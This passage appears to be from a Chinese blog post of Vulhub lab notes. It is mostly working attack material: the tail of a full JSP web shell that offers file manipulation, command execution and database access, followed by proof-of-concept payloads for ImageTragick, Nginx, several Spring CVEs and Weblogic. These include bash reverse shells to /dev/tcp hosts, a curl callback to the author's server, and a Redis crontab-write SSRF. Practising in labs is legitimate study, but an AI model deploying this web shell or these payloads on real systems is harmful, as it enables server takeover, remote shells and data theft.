class="line">                sF += l[i].getName() + &quot;\t&quot; + sT + &quot;\t&quot; + l[i].length() + &quot;\t&quot;</span><br><span class="line">                        + sQ + &quot;\n&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(sF);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void EE(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        if (f.isDirectory()) &#123;</span><br><span class="line">            File x[] = f.listFiles();</span><br><span class="line">            for (int k = 0; k &lt; x.length; k++) &#123;</span><br><span class="line">                if (!x[k].delete()) &#123;</span><br><span class="line">                    EE(x[k].getPath());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void FF(String s, HttpServletResponse r) throws Exception &#123;</span><br><span class="line">        int n;</span><br><span class="line">        byte[] b = new byte[512];</span><br><span class="line">        r.reset();</span><br><span class="line">        ServletOutputStream os = r.getOutputStream();</span><br><span class="line">        BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));</span><br><span class="line">        os.write((&quot;-&gt;&quot; + &quot;|&quot;).getBytes(), 0, 3);</span><br><span class="line">        while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">            os.write(b, 0, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.write((&quot;|&quot; + &quot;&lt;-&quot;).getBytes(), 0, 3);</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void GG(String s, String d) throws Exception &#123;</span><br><span class="line">        String h = &quot;0123456789ABCDEF&quot;;</span><br><span class="line">        int n;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.createNewFile();</span><br><span class="line">        FileOutputStream os = new FileOutputStream(f);</span><br><span class="line">        for (int i = 0; i &lt; d.length(); i += 2) &#123;</span><br><span class="line">            os</span><br><span class="line">                    .write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d</span><br><span class="line">                            .charAt(i + 1))));</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void HH(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);</span><br><span class="line">        if (sf.isDirectory()) &#123;</span><br><span class="line">            if (!df.exists()) &#123;</span><br><span class="line">                df.mkdir();</span><br><span class="line">            &#125;</span><br><span class="line">            File z[] = sf.listFiles();</span><br><span class="line">            for (int j = 0; j &lt; z.length; j++) &#123;</span><br><span class="line">                HH(s + &quot;/&quot; + z[j].getName(), d + &quot;/&quot; + z[j].getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            FileInputStream is = new FileInputStream(sf);</span><br><span class="line">            FileOutputStream os = new FileOutputStream(df);</span><br><span class="line">            int n;</span><br><span class="line">            byte[] b = new byte[512];</span><br><span class="line">            while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">                os.write(b, 0, n);</span><br><span class="line">            &#125;</span><br><span class="line">            is.close();</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void II(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);</span><br><span class="line">        sf.renameTo(df);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void JJ(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.mkdir();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void KK(String s, String t) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">        java.util.Date dt = fm.parse(t);</span><br><span class="line">        f.setLastModified(dt.getTime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void LL(String s, String d) throws Exception &#123;</span><br><span class="line">        URL u = new URL(s);</span><br><span class="line">        int n;</span><br><span class="line">        FileOutputStream os = new FileOutputStream(d);</span><br><span class="line">        HttpURLConnection h = (HttpURLConnection) u.openConnection();</span><br><span class="line">        InputStream is = h.getInputStream();</span><br><span class="line">        byte[] b = new byte[512];</span><br><span class="line">        while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">            os.write(b, 0, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">        h.disconnect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void MM(InputStream is, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String l;</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(is));</span><br><span class="line">        while ((l = br.readLine()) != null) &#123;</span><br><span class="line">            sb.append(l + &quot;\r\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void NN(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        ResultSet r = c.getMetaData().getCatalogs();</span><br><span class="line">        while (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(1) + &quot;\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void OO(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        String[] t = &#123; &quot;TABLE&quot; &#125;;</span><br><span class="line">        ResultSet r = c.getMetaData().getTables(null, null, &quot;%&quot;, t);</span><br><span class="line">        while (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(&quot;TABLE_NAME&quot;) + &quot;\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void PP(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(&quot;\r\n&quot;);</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(1005, 1007);</span><br><span class="line">        ResultSet r = m.executeQuery(&quot;select * from &quot; + x[3]);</span><br><span class="line">        ResultSetMetaData d = r.getMetaData();</span><br><span class="line">        for (int i = 1; i &lt;= d.getColumnCount(); i++) &#123;</span><br><span class="line">            sb.append(d.getColumnName(i) + &quot; (&quot; + d.getColumnTypeName(i)</span><br><span class="line">                    + &quot;)\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void QQ(String cs, String s, String q, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        int i;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(1005, 1008);</span><br><span class="line">        try &#123;</span><br><span class="line">            ResultSet r = m.executeQuery(q);</span><br><span class="line">            ResultSetMetaData d = r.getMetaData();</span><br><span class="line">            int n = d.getColumnCount();</span><br><span class="line">            for (i = 1; i &lt;= n; i++) &#123;</span><br><span class="line">                sb.append(d.getColumnName(i) + &quot;\t|\t&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(&quot;\r\n&quot;);</span><br><span class="line">            while (r.next()) &#123;</span><br><span class="line">                for (i = 1; i &lt;= n; i++) &#123;</span><br><span class="line">                    sb.append(EC(r.getString(i), cs) + &quot;\t|\t&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                sb.append(&quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            r.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            sb.append(&quot;Result\t|\t\r\n&quot;);</span><br><span class="line">            try &#123;</span><br><span class="line">                m.executeUpdate(q);</span><br><span class="line">                sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);</span><br><span class="line">            &#125; catch (Exception ee) &#123;</span><br><span class="line">                sb.append(ee.toString() + &quot;\t|\t\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;%&gt;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">&lt;%</span><br><span class="line">    String cs = request.getParameter(&quot;z0&quot;)==null?&quot;gbk&quot;: request.getParameter(&quot;z0&quot;) + &quot;&quot;;</span><br><span class="line">    request.setCharacterEncoding(cs);</span><br><span class="line">    response.setContentType(&quot;text/html;charset=&quot; + cs);</span><br><span class="line">    String Z = EC(request.getParameter(Pwd) + &quot;&quot;, cs);</span><br><span class="line">    String z1 = EC(request.getParameter(&quot;z1&quot;) + &quot;&quot;, cs);</span><br><span class="line">    String z2 = EC(request.getParameter(&quot;z2&quot;) + &quot;&quot;, cs);</span><br><span class="line">    StringBuffer sb = new StringBuffer(&quot;&quot;);</span><br><span class="line">    try &#123;</span><br><span class="line">        sb.append(&quot;-&gt;&quot; + &quot;|&quot;);</span><br><span class="line">        if (Z.equals(&quot;A&quot;)) &#123;</span><br><span class="line">            String s = new File(application.getRealPath(request</span><br><span class="line">                    .getRequestURI())).getParent();</span><br><span class="line">            sb.append(s + &quot;\t&quot;);</span><br><span class="line">            if (!s.substring(0, 1).equals(&quot;/&quot;)) &#123;</span><br><span class="line">                AA(sb);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (Z.equals(&quot;B&quot;)) &#123;</span><br><span class="line">            BB(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;C&quot;)) &#123;</span><br><span class="line">            String l = &quot;&quot;;</span><br><span class="line">            BufferedReader br = new BufferedReader(</span><br><span class="line">                    new InputStreamReader(new FileInputStream(new File(</span><br><span class="line">                            z1))));</span><br><span class="line">            while ((l = br.readLine()) != null) &#123;</span><br><span class="line">                sb.append(l + &quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125; else if (Z.equals(&quot;D&quot;)) &#123;</span><br><span class="line">            BufferedWriter bw = new BufferedWriter(</span><br><span class="line">                    new OutputStreamWriter(new FileOutputStream(</span><br><span class="line">                            new File(z1))));</span><br><span class="line">            bw.write(z2);</span><br><span class="line">            bw.close();</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;E&quot;)) &#123;</span><br><span class="line">            EE(z1);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;F&quot;)) &#123;</span><br><span class="line">            FF(z1, response);</span><br><span class="line">        &#125; else if (Z.equals(&quot;G&quot;)) &#123;</span><br><span class="line">            GG(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;H&quot;)) &#123;</span><br><span class="line">            HH(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;I&quot;)) &#123;</span><br><span class="line">            II(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;J&quot;)) &#123;</span><br><span class="line">            JJ(z1);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;K&quot;)) &#123;</span><br><span class="line">            KK(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;L&quot;)) &#123;</span><br><span class="line">            LL(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;M&quot;)) &#123;</span><br><span class="line">            String[] c = &#123; z1.substring(2), z1.substring(0, 2), z2 &#125;;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(c);</span><br><span class="line">            MM(p.getInputStream(), sb);</span><br><span class="line">            MM(p.getErrorStream(), sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;N&quot;)) &#123;</span><br><span class="line">            NN(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;O&quot;)) &#123;</span><br><span class="line">            OO(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;P&quot;)) &#123;</span><br><span class="line">            PP(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;Q&quot;)) &#123;</span><br><span class="line">            QQ(cs, z1, z2, sb);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    sb.append(&quot;|&quot; + &quot;&lt;-&quot;);</span><br><span class="line">    out.print(sb.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>蚁剑连上去</p><p><img src="/2018/11/01/初试Vulhub/2.jpg" alt=""></p><p>尝试了下反弹bash</p><p>不知道为什么失败了</p><h3 id="imagetragick"><a href="#imagetragick" class="headerlink" title="imagetragick"></a>imagetragick</h3><p>看到rr师傅在微博谈论某罪恶的扩展，顺便看到了Vulhub也有这个环境，搭来看看。</p><p>原理文章 <a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><p>记个payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_upload&quot;; filename=&quot;vul.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://127.0.0.0/image.png&quot;|curl &quot;xxx.xxx.xxx:8889)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>然后在自己的vps上</p><p> nc -l -p 8889</p><h3 id="CVE-2013-4547-Nginx解析漏洞"><a href="#CVE-2013-4547-Nginx解析漏洞" class="headerlink" title="CVE-2013-4547 Nginx解析漏洞"></a>CVE-2013-4547 Nginx解析漏洞</h3><p>文章<a href="http://www.91ri.org/9064.html" target="_blank" rel="noopener">www.91ri.org/9064.html</a></p><p><img src="/2018/11/01/初试Vulhub/3.jpg" alt="        "></p><p><img src="/2018/11/01/初试Vulhub/4.png" alt=""></p><p>大多数情况下，web应用在处理上传文件时，都会将文件重命名，通过应用自身添加后缀，或者对后缀名去掉特殊字符后，做类型判断，以上因素都导致此漏洞被认为是鸡肋漏洞，难以利用，而被人们所忽略。 </p><p>windows下的RCE</p><p>1.上传任意文件（不需要带空格文件） </p><p>2.<a href="http://127.0.0.1/a.jpg" target="_blank" rel="noopener">http://127.0.0.1/a.jpg</a> (非编码空格)\0.php </p><h3 id="Nginx-配置错误导致漏洞"><a href="#Nginx-配置错误导致漏洞" class="headerlink" title="Nginx 配置错误导致漏洞"></a>Nginx 配置错误导致漏洞</h3><h4 id="1-CRLF注入漏洞"><a href="#1-CRLF注入漏洞" class="headerlink" title="1.CRLF注入漏洞"></a>1.CRLF注入漏洞</h4><p>测试在谷歌浏览器上会成功，火狐上没成功</p><h4 id="2-目录穿越漏洞"><a href="#2-目录穿越漏洞" class="headerlink" title="2.目录穿越漏洞"></a>2.目录穿越漏洞</h4><p>错误配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /files &#123;</span><br><span class="line">alias /home/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /files/ &#123;</span><br><span class="line">alias /home/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问</p><p><a href="http://XXXXXX:8081/files../" target="_blank" rel="noopener">http://XXXXXX:8081/files../</a></p><p><img src="/2018/11/01/初试Vulhub/5.png" alt=""></p><h4 id="3-add-header被覆盖"><a href="#3-add-header被覆盖" class="headerlink" title="3.add_header被覆盖"></a>3.add_header被覆盖</h4><p>Nginx配置文件子块（server、location、if）中的<code>add_header</code>，将会覆盖父块中的<code>add_header</code>添加的HTTP头，造成一些安全隐患。</p><p>如下列代码，整站（父块中）添加了CSP头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add_header Content-Security-Policy &quot;default-src &apos;self&apos;&quot;;</span><br><span class="line">add_header X-Frame-Options DENY;</span><br><span class="line"></span><br><span class="line">location = /test1 &#123;</span><br><span class="line">    rewrite ^(.*)$ /xss.html break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location = /test2 &#123;</span><br><span class="line">    add_header X-Content-Type-Options nosniff;</span><br><span class="line">    rewrite ^(.*)$ /xss.html break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但<code>/test2</code>的location中又添加了<code>X-Content-Type-Options</code>头，导致父块中的<code>add_header</code>全部失效：</p><p><img src="/2018/11/01/初试Vulhub/6.jpg" alt=""></p><p>测试在火狐下会url编码，在谷歌浏览器下会触发</p><h3 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h3><h4 id="Spring-Security-OAuth2-远程命令执行漏洞（CVE-2016-4977）"><a href="#Spring-Security-OAuth2-远程命令执行漏洞（CVE-2016-4977）" class="headerlink" title="Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）"></a>Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）</h4><p>访问<code>http://your-ip:8080/oauth/authorize?response_type=${233*233}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code>。首先需要填写用户名和密码，我们这里填入<code>admin:admin</code>即可。</p><p>可见，我们输入是SpEL表达式<code>${233*233}</code>已经成功执行并返回结果：</p><p>Java反弹shell的限制与绕过方式，可以参考这个网站的</p><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p><img src="/2018/11/01/初试Vulhub/7.jpg" alt=""></p><p>然后用poc来生成反弹shell的表达式</p><p><img src="/2018/11/01/初试Vulhub/8.jpg" alt=""></p><p>生成了一大串SpEL语句 </p><p>response_type=${233*233}这个表达式变成上面那个SpEL语句那个即可反弹shell</p><h4 id="Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）"><a href="#Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）" class="headerlink" title="Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）"></a>Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</h4><p>POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1&quot;)).start()=vulhub</span><br></pre></td></tr></table></figure><p>这里要把&amp; url编码城%26 即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;%26 /dev/tcp/10.0.0.1/21 0&gt;%261&quot;)).start()=vulhub</span><br></pre></td></tr></table></figure><p><img src="/2018/11/01/初试Vulhub/9.jpg" alt=""></p><h4 id="Spring-Data-Rest-远程命令执行漏洞（CVE-2017-8046）"><a href="#Spring-Data-Rest-远程命令执行漏洞（CVE-2017-8046）" class="headerlink" title="Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）"></a>Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）</h4><p>注意请求方法是PATCH</p><p>POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PATCH /customers/1 HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json-patch+json</span><br><span class="line">Content-Length: 202</span><br><span class="line"></span><br><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;表示的命令touch /tmp/success</span><br></pre></td></tr></table></figure><h4 id="Spring-Messaging-远程命令执行漏洞（CVE-2018-1270）"><a href="#Spring-Messaging-远程命令执行漏洞（CVE-2018-1270）" class="headerlink" title="Spring Messaging 远程命令执行漏洞（CVE-2018-1270）"></a>Spring Messaging 远程命令执行漏洞（CVE-2018-1270）</h4><p>spring messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，</p><p>在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用<code>StandardEvaluationContext</code>解析，造成命令执行漏洞。</p><h4 id="Spring-Data-Commons-远程命令执行漏洞（CVE-2018-1273）"><a href="#Spring-Data-Commons-远程命令执行漏洞（CVE-2018-1273）" class="headerlink" title="Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）"></a>Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</h4><p>注意</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;</span><br></pre></td></tr></table></figure><p>不知道为何反弹shell失败了</p><h3 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h3><h4 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具"></a>检测工具</h4><p>Weblogic一键漏洞检测工具 ： <a href="https://github.com/rabbitmask/WeblogicScan" target="_blank" rel="noopener">https://github.com/rabbitmask/WeblogicScan</a></p><h4 id="Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><a href="#Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）"></a>Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</h4><p>url : <a href="http://xxx.com:7001/wls-wsat/CoordinatorPortType" target="_blank" rel="noopener">http://xxx.com:7001/wls-wsat/CoordinatorPortType</a></p><p>POC 注意其中反弹shell的语句，需要进行编码 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/21 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><h4 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h4><p>该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。 </p><p>跑POC就是了</p><h4 id="Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894）</h4><p>Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。 </p><h4 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h4><p>漏洞url</p><p><code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code> </p><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.18.0.3:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>可进行利用的cron有如下几个地方</p><ul><li>/etc/crontab 这个是肯定的</li><li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li><li>/var/spool/cron/root centos系统下root用户的cron文件</li><li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li></ul><h3 id="后记"><a href="#后记" class="headerlink" 